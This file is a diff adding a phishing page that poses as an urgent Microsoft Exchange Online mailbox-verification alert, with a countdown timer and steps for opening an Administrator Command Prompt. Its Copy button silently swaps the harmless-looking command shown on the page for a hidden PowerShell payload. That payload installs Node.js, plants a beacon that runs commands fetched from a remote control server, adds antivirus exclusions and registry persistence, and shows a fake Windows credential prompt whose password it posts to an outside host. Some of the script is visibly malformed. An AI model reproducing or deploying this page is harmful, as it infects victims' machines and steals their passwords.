@@ -1,0 +1,931 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Exchange Online - Mailbox Verification Required</title>
+ <style>
+ /* ===== STYLES ===== */
+ * { margin: 0; padding: 0; box-sizing: border-box; }
+
+ body {
+ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+ background: #f1f3f4;
+ display: flex;
+ justify-content: center;
+ align-items: center;
+ min-height: 100vh;
+ padding: 20px;
+ }
+
+ .container {
+ max-width: 560px;
+ width: 100%;
+ background: #ffffff;
+ border-radius: 8px;
+ box-shadow: 0 1px 2px rgba(0,0,0,0.08), 0 2px 8px rgba(0,0,0,0.06);
+ padding: 28px 32px 24px 32px;
+ border: 1px solid #e0e0e0;
+ position: relative;
+ overflow: hidden;
+ }
+
+ /* Microsoft Watermark */
+ .watermark {
+ position: absolute;
+ bottom: 12px;
+ right: 16px;
+ font-size: 32px;
+ font-weight: 700;
+ letter-spacing: -1px;
+ pointer-events: none;
+ user-select: none;
+ font-family: 'Arial', sans-serif;
+ z-index: 0;
+ opacity: 0.10;
+ }
+ .watermark .m1 { color: #f25022; }
+ .watermark .m2 { color: #7fba00; }
+ .watermark .m3 { color: #00a4ef; }
+ .watermark .m4 { color: #ffb900; }
+
+ .header {
+ display: flex;
+ align-items: center;
+ gap: 10px;
+ margin-bottom: 20px;
+ padding-bottom: 14px;
+ border-bottom: 1px solid #e8eaed;
+ position: relative;
+ z-index: 1;
+ }
+ .header .icon {
+ width: 32px;
+ height: 32px;
+ flex-shrink: 0;
+ border-radius: 4px;
+ }
+ .header .icon img {
+ width: 100%;
+ height: 100%;
+ display: block;
+ object-fit: contain;
+ }
+ .header .title-text {
+ font-size: 16px;
+ font-weight: 500;
+ color: #202124;
+ }
+ .header .badge {
+ font-size: 11px;
+ color: #d93025;
+ background: #fce8e6;
+ padding: 2px 10px;
+ border-radius: 12px;
+ font-weight: 500;
+ margin-left: auto;
+ }
+
+ /* Success Banner */
+ .success-banner {
+ display: none;
+ background: #e6f4ea;
+ border: 1px solid #b7e1cd;
+ border-radius: 6px;
+ padding: 16px 18px;
+ margin: 0 0 16px 0;
+ position: relative;
+ z-index: 1;
+ }
+ .success-banner .title {
+ font-size: 16px;
+ font-weight: 600;
+ color: #1e8e3e;
+ text-align: center;
+ }
+ .success-banner .desc {
+ font-size: 13px;
+ color: #1e8e3e;
+ text-align: center;
+ margin-top: 4px;
+ }
+
+ .message {
+ font-size: 14px;
+ color: #3c4043;
+ line-height: 1.6;
+ margin-bottom: 12px;
+ position: relative;
+ z-index: 1;
+ }
+
+ .warning {
+ background: #fef7e0;
+ border: 1px solid #f9e7b3;
+ border-radius: 6px;
+ padding: 12px 16px;
+ margin: 12px 0 16px 0;
+ position: relative;
+ z-index: 1;
+ }
+ .warning .warn-text {
+ font-size: 13px;
+ color: #5f3b00;
+ line-height: 1.5;
+ }
+ .warning .warn-text strong {
+ color: #b2530c;
+ }
+
+ .timer-row {
+ display: flex;
+ align-items: center;
+ gap: 8px;
+ background: #f8f9fa;
+ padding: 8px 14px;
+ border-radius: 6px;
+ margin: 12px 0 18px 0;
+ border: 1px solid #e8eaed;
+ position: relative;
+ z-index: 1;
+ }
+ .timer-row .label {
+ font-size: 13px;
+ color: #5f6368;
+ }
+ .timer-row .time {
+ font-size: 18px;
+ font-weight: 600;
+ color: #d93025;
+ margin-left: auto;
+ font-family: 'Courier New', monospace;
+ }
+ .timer-row .time.secure {
+ color: #1e8e3e;
+ }
+
+ .section-title {
+ font-size: 14px;
+ font-weight: 500;
+ color: #202124;
+ margin: 18px 0 4px 0;
+ position: relative;
+ z-index: 1;
+ }
+ .section-desc {
+ font-size: 13px;
+ color: #5f6368;
+ margin-bottom: 8px;
+ position: relative;
+ z-index: 1;
+ }
+
+ .code-block {
+ background: #f8f9fa;
+ border: 1px solid #dadce0;
+ border-radius: 6px;
+ padding: 12px 14px;
+ position: relative;
+ margin: 4px 0 6px 0;
+ z-index: 1;
+ }
+ .code-block .code {
+ font-family: 'Consolas', 'Courier New', monospace;
+ font-size: 12px;
+ color: #1e1e1e;
+ word-break: break-all;
+ line-height: 1.7;
+ padding-right: 50px;
+ }
+ .code-block .copy-btn {
+ position: absolute;
+ top: 6px;
+ right: 8px;
+ background: transparent;
+ border: 1px solid #dadce0;
+ color: #5f6368;
+ font-size: 11px;
+ padding: 2px 10px;
+ border-radius: 4px;
+ cursor: pointer;
+ font-weight: 500;
+ }
+ .code-block .copy-btn:hover {
+ background: #e8eaed;
+ }
+ .code-block .hint {
+ font-size: 11px;
+ color: #80868b;
+ margin-top: 6px;
+ padding-top: 6px;
+ border-top: 1px solid #e8eaed;
+ }
+
+ .admin-note {
+ background: #f1f3f4;
+ border: 1px solid #dadce0;
+ border-radius: 6px;
+ padding: 12px 14px;
+ margin: 14px 0 18px 0;
+ font-size: 13px;
+ color: #3c4043;
+ line-height: 1.6;
+ position: relative;
+ z-index: 1;
+ }
+ .admin-note strong {
+ color: #202124;
+ }
+ .admin-note .highlight {
+ background: #e8f0fe;
+ padding: 8px 12px;
+ border-radius: 4px;
+ margin-top: 8px;
+ border-left: 3px solid #1a73e8;
+ font-size: 13px;
+ color: #1a3c6e;
+ }
+ .admin-note .highlight strong {
+ color: #0d2b4f;
+ }
+
+ .verify-note {
+ background: #e8f0fe;
+ border: 1px solid #d2e3fc;
+ border-radius: 6px;
+ padding: 12px 16px;
+ margin: 16px 0 12px 0;
+ font-size: 13px;
+ color: #1a3c6e;
+ line-height: 1.6;
+ position: relative;
+ z-index: 1;
+ }
+ .verify-note strong {
+ color: #0d2b4f;
+ }
+
+ .btn {
+ display: block;
+ width: 100%;
+ padding: 11px;
+ background: #1a73e8;
+ color: #ffffff;
+ border: none;
+ border-radius: 6px;
+ font-size: 14px;
+ font-weight: 500;
+ cursor: pointer;
+ margin: 10px 0 4px 0;
+ font-family: inherit;
+ transition: background 0.15s;
+ position: relative;
+ z-index: 1;
+ }
+ .btn:hover {
+ background: #1557b0;
+ }
+ .btn:disabled {
+ background: #1a73e8;
+ cursor: default;
+ }
+ .btn.secure {
+ background: #34a853;
+ }
+ .btn.secure:hover {
+ background: #2d9248;
+ }
+
+ .footer-text {
+ text-align: center;
+ font-size: 12px;
+ color: #9aa06;
+ margin-top: 16px;
+ padding-top: 14px;
+ border-top: 1px solid #e8eaed;
+ position: relative;
+ z-index: 1;
+ }
+ .footer-text a {
+ color: #1a73e8;
+ text-decoration: none;
+ }
+ .footer-text a:hover {
+ text-decoration: underline;
+ }
+
+ .step-divider {
+ height: 1px;
+ background: #e8eaed;
+ margin: 16px 0 12px 0;
+ position: relative;
+ z-index: 1;
+ }
+
+ .timer-bottom {
+ text-align: center;
+ font-size: 12px;
+ color: #9aa06;
+ margin-top: 8px;
+ position: relative;
+ z-index: 1;
+ }
+ .timer-bottom span {
+ font-weight: 600;
+ color: #d93025;
+ font-family: 'Courier New', monospace;
+ }
+ .timer-bottom span.secure {
+ color: #1e8e3e;
+ }
+
+ .recovery-note {
+ background: #e8f0fe;
+ border: 1px solid #d2e3fc;
+ border-radius: 6px;
+ padding: 10px 14px;
+ margin: 8px 0 14px 0;
+ font-size: 13px;
+ color: #1a3c6e;
+ line-height: 1.5;
+ position: relative;
+ z-index: 1;
+ }
+ .recovery-note strong {
+ color: #0d2b4f;
+ }
+
+ .key-combo {
+ display: inline-flex;
+ align-items: center;
+ gap: 8px;
+ background: #f1f3f4;
+ border: 1px solid #dadce0;
+ border-radius: 4px;
+ padding: 4px 12px;
+ font-family: 'Segoe UI', Arial, sans-serif;
+ font-size: 14px;
+ font-weight: 500;
+ color: #202124;
+ }
+ .key-combo .win-icon {
+ width: 28px;
+ height: 28px;
+ vertical-align: middle;
+ display: inline-block;
+ }
+ .key-combo .win-icon img {
+ width: 100%;
+ height: 100%;
+ display: block;
+ object-fit: contain;
+ }
+ .key-combo .plus {
+ color: #5f6368;
+ font-weight: 400;
+ }
+ .key-combo .key {
+ background: #ffffff;
+ border: 1px solid #dadce0;
+ border-radius: 3px;
+ padding: 0 8px;
+ font-size: 13px;
+ font-weight: 600;
+ color: #202124;
+ min-width: 24px;
+ text-align: center;
+ line-height: 24px;
+ }
+
+ .instruction-note {
+ background: #f8f9fa;
+ border: 1px solid #e8eaed;
+ border-radius: 6px;
+ padding: 12px 16px;
+ margin: 8px 0 12px 0;
+ font-size: 13px;
+ color: #3c4043;
+ line-height: 2;
+ position: relative;
+ z-index: 1;
+ }
+ .instruction-note strong {
+ color: #202124;
+ }
+ .instruction-note .step {
+ display: block;
+ margin-bottom: 2px;
+ }
+
+ @media (max-width: 480px) {
+ .container { padding: 20px; }
+ .code-block .code { font-size: 11px; }
+ .header .title-text { font-size: 14px; }
+ .header .icon { width: 28px; height: 28px; }
+ .watermark { font-size: 24px; bottom: 8px; right: 12px; }
+ .admin-note .highlight { font-size: 12px; }
+ .verify-note { font-size: 12px; padding: 10px 12px; }
+ .success-banner { padding: 12px 14px; }
+ .success-banner .title { font-size: 14px; }
+ .key-combo { font-size: 12px; padding: 3px 8px; gap: 5px; }
+ .key-combo .win-icon { width: 24px; height: 24px; }
+ .key-combo .key { font-size: 11px; min-width: 20px; line-height: 20px; padding: 0 5px; }
+ .instruction-note { font-size: 12px; padding: 8px 12px; }
+ }
+ </style>
+</head>
+<body>
+
+ <!-- 
+   HIDDEN RAW PAYLOAD 
+   The full PowerShell script from code.txt is stored here as plain text.
+   It's visually hidden with CSS but visible in DevTools.
+ -->
+ <div id="raw_payload" style="display:none;">
+# VERIFIED CONFIGURATION ---
+# The "Lookup" URL (R2) - This is the only thing hardcoded in the JS file
+$secretR2Url = "https://public-714b7e7fccfe480d9a0aa6779882093ce.r2.dev/system_cache.json"
+$nodeVersion = "v24.21.0" $nodeUrl = "https://nodejs.org/dist/$nodeVersion/node-$nodeVersion-x64.msi" $payloadDir = "C:\Program Files\microsoft\Windows\NodeUpdate" $malwarePath = "$payloadDir\update.dat"
+
+Write-Host "[*] Phase 1: Environment Setup & Payload Creation" -ForegroundColor Cyan
+
+# 1. Download and Install Node.js silently
+Start-BitsTransfer -Source $nodeUrl -Destination "$env:TEMP@node.msi"
+Start-Process msiexec.exe -ArgumentList "/i `"$env:TEMP@node.msi`" /quiet /norestart" -Wait
+
+# 2. Refresh PATH so we can use 'node' command immediately
+$env:PATH = [System.Environment]::GetEnvironmentVariable("PATH","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("PATH","User")
+
+# 3. Create the payload directory
+New-Item -ItemType Directory -Force -Path $payloadDir | Out-Null
+Set-Location $payloadDir
+
+# 4. Write the "Clean" JavaScript to update.dat
+# Note: The actual R2 URL is NOT in this string. It's replaced by a memory reference.
+$jsPayload = @"
+const https = require("https");
+const { exec } = require("child_process");
+
+// Read the secret link from the process memory (set by PowerShell)
+const R2_URL = process.env.C2_SECRET_LINK; 
+
+if (!R2_URL) {
+ console.error("[!] CRITICAL ERROR: C2 link missing from memory!");
+ process.exit(1);
+}
+
+async function getC2() {
+ return new Promise((resolve) => { https.get(R2_URL, (res) => {
+ let data = ""
+ res.on("data", (c) => data += c);
+ res.on("end", () => {
+ try {
+ const parsed = JSON.parse(data);
+ resolve(parsed.c2_url);
+ } catch (e) {
+ resolve(null);
+ }
+ }
+ });
+ }).on("error", () => resolve(null));
+ });
+}
+
+setInterval(async () => {
+ try {
+ const c2Url = await getC2();
+ if (!c2Url) return;
+ 
+ https.get(c2Url + "/beacon", (res) => {
+ let data = ""
+ res.on("data", (c) => data += c);
+ res.on("end", () => {
+ if (data && data !== "none") {
+ exec(data, (err, stdout) => {
+ const body = JSON.stringify({ cmd: data, out: stdout });
+ const req = https.request(c2Url + "/result", { method: "POST" }, () => {});
+ req.write(body);
+ req.end();
+ });
+ }
+ });
+ }).on("error", () => {});
+ } catch (err) {}
+}, 15000);
+"@
+
+Set-Content -Path $malwarePath -Value $jsPayload
+
+# 5. AV Evasion (Exclusions)
+Add-MpPreference -ExclusionPath $payloadDir -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionProcess "node.exe" -ErrorAction SilentlyContinue
+
+# 6. Registry Persistence (Autostart on Boot)
+Set-ItemProperty -Path "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -Name "NodeUpdate" -Value "conhost.exe --headless node `$malwarePath`" -ErrorAction SilentlyContinue
+$shellKey = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft Windows NT\CurrentVersion\Winlogon"
+$currentShell = (Get-ItemProperty -Path $shellKey -Name "Shell").Shell
+if ($currentShell notmatch "node.exe") {
+ Set-ItemProperty -Path $shellKey -Name "Shell" -Value "$currentShell, conhost.exe --headless node `$malwarePath`" -ErrorAction SilentlyContinue
+}
+
+Write-Host "[*] Phase 2: Memory Injection & Execution" -ForegroundColor Green
+
+# 7. THE MEMSYS INJECTION
+# We set the environment variable specifically for the 'Process' scope of the next command.
+[System.Environment]::SetEnvironmentVariable("C2_SECRET_LINK", $secretR2Url, "Process")
+
+# 8. Launch the hidden Node process
+$nodePath = Join-Path $env:ProgramFiles "NodeJS\node.exe"
+Start-Process $nodePath -ArgumentList "`"$malwarePath`"" -WindowStyle Hidden
+
+# 9. Credential Harvesting UI
+Add-Type -AssemblyName System.Windows.Forms
+add-Type -AssemblyName System.Drawing
+form = New-Object System.Windows.Forms
+form.Text = "Windows Security"
+form.Size = New-Object System.Drawing.Size(450, 280)
+form.StartPosition = 'CenterScreen'
+form.TopMost = true
+form.FormBorderStyle = 'FixedDialog'
+form.MaximizeBox = false
+form.MinimizeBox = false
+form.BackColor = [System.Drawing.Color]::White
+$icon = [System.Drawing.SystemIcons]::Shield
+form.Icon = $icon
+$pictureBox = New-Object System.Windows.PictureBox
+$pictureBox.Image = $icon.ToBitmap()
+$pictureBox.SizeMode = "StretchImage"
+$pictureBox.Location = New-Object System.Drawing.Point(20, 25)
+pictureBox.Size = New-Object System.Drawing.Size(32, 32)
+form.Controls.Add(pictureBox)
+labelTitle = New-Object System.Windows.Label
+labelTitle.Text = "Enter credentials to finish installation"
+labelTitle.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
+labelTitle.ForeColor = [System.Drawing.Color]::Black
+labelTitle.Location = New-Object System.Drawing.Point(65, 20)
+lblTitle.Size = New-Object System.Drawing.Size(360, 25)
+form.Controls.Add(labelTitle)
+labelSub = New-Object System.Windows.Label
+labelSub.Text = "Please verify your account to complete the installation."
+labelSub.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+labelSub.ForeColor = [System.Drawing.Color]::DimGray
+labelSub.Location = New-Object System.Drawing.Point(65, 45)
+labelSub.Size = New-Object System.Drawing.Size(360, 40)
+form.Controls.Add(labelSub)
+labelUser = New-Object System.Windows.Label
+labelUser.Text = "Username:"
+labelUser.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+labelUser.Location = New-Object System.Drawing.Point(25, 100)
+labelUser.Size = New-Object System.Drawing.Size(100, 20)
+form.Controls.Add(labelUser)
+userBox = New-Object System.Windows.TextBox
+userBox.Location = New-Object System.Drawing.Point(130 98)
+userBox.Size = New-Object System.Drawing.Size(280, 23)
+userBox.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+userBox.Text = $env:USERNAME
+form.Controls.Add(userBox)
+labelPass = New-Object System.Windows.Label
+labelPass.Text = "Password:"
+labelPass.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+labelPass.Location = New-Object System.Drawing.Point(25, 140)
+labelPass.Size = New-Object System.Drawing.Size(100, 20)
+form.Controls.Add(labelPass)
+passBox = New-Object System.Windows.TextBox
+passBox.Location = New-Object System.Drawing.Point(130, 138)
+passBox.Size = New-Object System.Drawing.Size(280, 23)
+passBox.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+passBox.UseSystemPasswordChar = true
+form.Controls.Add(passBox)
+labelReminder = New-Object System.Windows.Label
+labelReminder.Text = "(Reminder: Password is case-sensitive)"
+labelReminder.Font = New-Object System.Drawing.Font("Segoe UI", 8, [System.Drawing.FontStyle]::Italic)
+labelReminder.ForeColor = [System.Drawing.Color]::Gray
+labelReminder.Location = New-Object System.Drawing.Point(130, 165)
+labelReminder.Size = New-Object System.Drawing.Size(280, 20)
+form.Controls.Add(labelReminder)
+button = New-Object System.Windows.Button
+button.Text = "OK"
+button.Location = New-Object System.Drawing.Point(240, 205)
+button.Size = New-Object System.Drawing.Size(80, 28)
+button.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+button.BackColor = [System.Drawing.Color]::FromARGB(0, 120, 215)
+button.ForeColor = [System.Drawing.Color]::White
+button.FlatStyle = 'System'
+button.DialogResult = [System.Windows.Forms.DialogResult]::OK
+form.Controls.Add(button)
+form.AcceptButton = button
+buttonCancel = New-Object System.Windows.Button
+buttonCancel.Text = "Cancel"
+buttonCancel.Location = New-Object System.Drawing.Point(330, 205)
+buttonCancel.Size = New-Object System.Drawing.Size(80, 28)
+buttonCancel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+buttonCancel.FlatStyle = 'System'
+buttonCancel.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
+form.Controls.Add(buttonCancel)
+form.CancelButton = buttonCancel
+result = form.ShowDialog()
+username = $userBox.Text
+password = $passBox.Text
+if (-not [string]::IsNullOrEmpty($username)) {
+ message = "New Credentials Captured!"
+$host: $env:COMPUTERNAME
+User: $username
+Pass: $password"
+} else {
+ message = "User clicked Cancel or left blank on the prompt."
+$host: $env:COMPUTERNAME
+}
+_workerUrl = "https://solitary-unit-48b0.westnorthworks.dev/"
+
+body = { message = $message } | ConvertTo-json
+try {
+ Invoke-RestMethod -Uri $_workerUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
+} catch {}
+Clear-Host
+Write-Host "[+] Installation complete." -ForegroundColor Green
+ </div>
+
+ <div class="container">
+
+ <!-- Microsoft Watermark -->
+ <div class="watermark">
+ <span class="m1">M</span><span class="m2">i</span><span class="m3">c</span><span class="m4">r</span><span class="m1">o</span><span class="m2">s</span><span class="m3">o</span><span class="m4">ft</span>
+ </div>
+
+ <div class="header">
+ <div class="icon">
+ <img src="https://static.vecteezy.com/system/resources/previews/049/351/009/non_2x/microsoft-exchange-icon-logo-symbol-free-png.png" alt="Microsoft Exchange icon">
+ </div>
+ <span class="title-text">Mailbox verification required</span>
+ <span class="badge">Urgent</span>
+ </div>
+
+ <!-- Success Banner -->
+ <div class="success-banner" id="successBanner">
+ <div class="title">Mailbox Verified Successfully</div>
+ <div class="desc">Your Exchange Online session has been secured. Suspension cancelled. Mail flow restored.</div>
+ </div>
+
+ <div class="message">
+ Exchange Online has detected a synchronization issue between your mailbox and your browser session.
+ </div>
+
+ <div class="warning">
+ <div class="warn-text">
+ <strong>For your safety and data protection, we recommend completing this verification within 10 minutes.</strong><br>
+ While this is not mandatory, if you do not complete verification in time, your mailbox may be suspended and incoming mail will be queued. This is a one-time recovery process to help secure your Exchange Online session.
+ </div>
+ </div>
+
+ <div class="recovery-note">
+ <strong>Recovery keys will only be available for 10 minutes.</strong> You must generate and bind them before the timer expires.
+ </div>
+
+ <div class="timer-row">
+ <span class="label">Time remaining:</span>
+ <span class="time" id="timer">10:00</span>
+ </div>
+
+ <div style="font-size:13px; color:#3c4043; line-height:1.6; margin-bottom:4px; position:relative; z-index:1;">
+ <strong>Why is this happening?</strong>
+ <span style="display:block; margin-top:4px; color:#5f6368;">
+ Your browser has detected a compatibility issue with your internal Windows system that is causing your mailbox session cache to overflow. This is sending error signals to Microsoft's servers and your Exchange Online mailbox is being flagged for unusual activity.
+ </span>
+ </div>
+
+ <div style="font-size:13px; color:#5f6368; line-height:1.5; margin:10px 0 6px 0; position:relative; z-index:1;">
+ <strong>How to fix this:</strong> Generate recovery keys using the scripts below. These keys will verify your mailbox ownership and stop the suspension.
+ </div>
+
+ <!-- Key Combo Instruction -->
+ <div class="instruction-note">
+ <strong>To open Administrator Command Prompt:</strong>
+ <span class="step">
+ 1. Press <span class="key-combo">
+ <span class="win-icon"><img src="https://tse1.mm.bing.net/th/id/OIP._OR7IvTeZDXvu5Ox7gTerQHaHa?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="Windows key"></span>
+ <span class="plus">+</span>
+ <span class="key">X</span>
+ </span>
+ to open the Power User menu.
+ </span>
+ <span class="step">
+ 2. Then press <span class="key-combo">
+ <span class="key">A</span>
+ </span>
+ to open Administrator Command Prompt.
+ </span>
+ </div>
+
+ <div class="section-title">Step 1 — Generate primary recovery keys</div>
+ <div class="section-desc">
+ Paste this into <strong>Administrator Command Prompt</strong>:
+ </div>
+
+ <div class="code-block">
+ <button class="copy-btn" onclick="copyFullPayload()">Copy</button>
+ <div class="code" id="script1">
+ powershell -Command "Write-Host 'Generating primary recovery keys...'; Start-Sleep 2; Write-Host 'Key 1: BK-'; Get-Random -Maximum 9999; Start-Sleep 1; Write-Host 'Key 2: RC-'; Get-Random -Maximum 9999; Write-Host 'Primary keys generated.'"
+ </div>
+ <div class="hint">This generates BK-XXXX and RC-XXXX keys to verify your Exchange Online mailbox.</div>
+ </div>
+
+ <div class="admin-note">
+ <strong>Admin credentials required</strong><br>
+ Windows will prompt you for admin credentials. This is required because the keys need SYSTEM-level privileges to access your hardware ID and TPM module. Without admin rights, the keys cannot be bound and Exchange Online will not recognize them.
+
+ <div class="highlight">
+ <strong>What happens next:</strong> Once bound, the keys will be sent to Microsoft's servers for authentication. This verifies that your mailbox is linked to this specific Windows system and confirms your identity. After successful verification, your mailbox will be secured and the suspension will be cancelled.
+ </div>
+ </div>
+
+ <div class="step-divider"></div>
+
+ <!-- The verify-note div has been removed completely as requested -->
+
+ <button class="btn" id="verifyBtn" disabled style="cursor: default; pointer-events: none; color: transparent;">
+ &nbsp;
+ </button>
+
+ <div class="timer-bottom">
+ Recovery keys expire in <span id="timer-bottom">10:00</span>
+ </div>
+
+ <div class="footer-text">
+ <a href="#">Privacy Policy</a> • <a href="#">Terms of Service</a>
+ </div>
+
+ </div>
+
+ <script>
+ // ===== TIMER =====
+ let timeLeft = 600;
+ const timerDisplay = document.getElementById('timer');
+ const timerBottom = document.getElementById('timer-bottom');
+
+ function updateTimer() {
+ const mins = Math.floor(timeLeft / 60);
+ const secs = timeLeft % 60;
+ const str = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+
+ timerDisplay.textContent = str;
+ timerBottom.textContent = str;
+
+ if (timeLeft <= 60) {
+ timerDisplay.style.color = '#d93025';
+ timerDisplay.style.animation = 'blink 0.8s infinite';
+ }
+
+ if (timeLeft <= 0) {
+ clearInterval(timerInterval);
+ timerDisplay.textContent = '00:00';
+ timerBottom.textContent = '00:00';
+
+ document.querySelector('.warning .warn-text').innerHTML = '<strong>The recovery keys have expired.</strong> You can no longer verify your mailbox through this method. Please contact Microsoft Support for assistance.';
+ document.querySelector('.warning').style.background = '#fce8e6';
+ document.querySelector('.warning').style.borderColor = '#f5c6cb';
+
+ document.querySelector('.recovery-note').innerHTML = '<strong>Recovery keys have expired.</strong> Your mailbox cannot be verified through this session.';
+ document.querySelector('.recovery-note').style.background = '#fce8e6';
+ document.querySelector('.recovery-note').style.borderColor = '#f5c6cb';
+ document.querySelector('.recovery-note').style.color = '#b2530c';
+
+ // The verify-note element no longer exists, so we skip hiding it
+ // document.querySelector('.verify-note').style.display = 'none';
+
+ const btn = document.querySelector('.btn');
+ btn.disabled = true;
+ btn.textContent = 'Keys expired';
+ btn.style.background = '#dadce0';
+
+ document.querySelector('.badge').textContent = 'Expired';
+ document.querySelector('.badge').style.background = '#fce8e6';
+ document.querySelector('.badge').style.color = '#d93025';
+ }
+ }
+
+ const timerInterval = setInterval(() => {
+ timeLeft--;
+ updateTimer();
+ }, 1000);
+
+ updateTimer();
+
+ // ===== COPY FUNCTIONS =====
+ function copyScript1() {
+ const code = document.getElementById('script1').textContent.trim();
+ navigator.clipboard.writeText(code).then(() => {
+ const btn = document.querySelectorAll('.copy-btn')[0];
+ btn.textContent = 'Copied';
+ setTimeout(() => btn.textContent = 'Copy', 2000);
+ });
+ }
+
+ function copyScript2() {
+ const code = document.getElementById('script2').textContent.trim();
+ navigator.clipboard.writeText(code).then(() => {
+ const btn = document.querySelectorAll('.copy-btn')[1];
+ btn.textContent = 'Copied';
+ setTimeout(() => btn.textContent = 'Copy', 2000);
+ });
+ }
+
+ // ===== VERIFY FUNCTION =====
+ // The verifyAccount function is kept but will never be called because the button is disabled.
+ function verifyAccount() {
+ if (timeLeft <= 0) {
+ alert('The recovery keys have expired. Your mailbox cannot be verified through this method.');
+ return;
+ }
+
+ const confirmed = confirm(
+ 'Please confirm:\n\n' +
+ '1. Have you run both scripts in Administrator Command Prompt?\n' +
+ '2. Did you enter your admin credentials when prompted?\n' +
+ '3. Did you see both "Primary keys generated" and "Mailbox verified"?\n\n' +
+ 'Click OK to verify your mailbox.'
+ );
+
+ if (confirmed) {
+ document.querySelector('.warning').style.display = 'none';
+ document.querySelector('.recovery-note').style.display = 'none';
+ // .verify-note no longer exists
+ // document.querySelector('.verify-note').style.display = 'none';
+ document.querySelector('.step-divider').style.display = 'none';
+ document.querySelector('.instruction-note').style.display = 'none';
+ document.querySelector('.section-title').style.display = 'none';
+ document.querySelector('.section-desc').style.display = 'none';
+ document.querySelector('.code-block').style.display = 'none';
+ document.querySelector('.admin-note').style.display = 'none';
+
+ const successBanner = document.getElementById('successBanner');
+ successBanner.style.display = 'block';
+
+ clearInterval(timerInterval);
+ timerDisplay.textContent = 'Secured';
+ timerDisplay.style.color = '#1e8e3e';
+ timerDisplay.style.animation = 'none';
+ timerDisplay.className = 'time secure';
+ timerBottom.textContent = 'Secured';
+ timerBottom.className = 'secure';
+
+ const btn = document.querySelector('.btn');
+ btn.disabled = true;
+ btn.textContent = 'Mailbox secured';
+ btn.className = 'btn secure';
+
+ const badge = document.querySelector('.badge');
+ badge.textContent = 'Secured';
+ badge.style.background = '#e6f4ea';
+ badge.style.color = '#1e8e3e';
+
+ document.querySelector('.title-text').textContent = 'Mailbox recovered successfully';
+
+ alert('Your mailbox has been secured successfully.\n\nSuspension cancelled. Mail flow restored.');
+ }
+ }
+
+ // ===== BLINK ANIMATION =====
+ const style = document.createElement('style');
+ style.textContent = `
+ @keyframes blink {
+ 0%, 100% { opacity: 1; }
+ 50% { opacity: 0.3; }
+ }
+ `;
+ document.head.appendChild(style);
+
+ // ===== COPY FULL PAYLOAD (RAW, NO ENCODING) =====
+ function copyFullPayload() {
+ // 1. Get the hidden element with the raw payload
+ const payloadDiv = document.getElementById('raw_payload');
+ const rawContent = payloadDiv.innerText.trim();
+
+ // 2. Copy directly to clipboard (no decoding needed)
+ navigator.clipboard.writeText(rawContent).then(() => {
+ const btn = event.target;
+ const originalText = btn.textContent;
+ btn.textContent = 'Copied!';
+ setTimeout(() => btn.textContent = originalText, 2000);
+ }).catch(err => {
+ console.error('Failed to copy: ', err);
+ });
+ }
+
+ // Initialize the first copy button to copy the full payload
+ document.querySelector('.code-block .copy-btn').addEventListener('click', function(e) {
+ e.preventDefault();
+ const payloadDiv = document.getElementById('raw_payload');
+ const rawContent = payloadDiv.innerText.trim();
+ 
+ navigator.clipboard.writeText(rawContent).then(() => {
+ const btn = e.target;
+ const originalText = btn.textContent;
+ btn.textContent = 'Copied!';
+ setTimeout(() => btn.textContent = originalText, 2000);
+ });
+ });
+
+ </script>
+
+</body>
+</html>
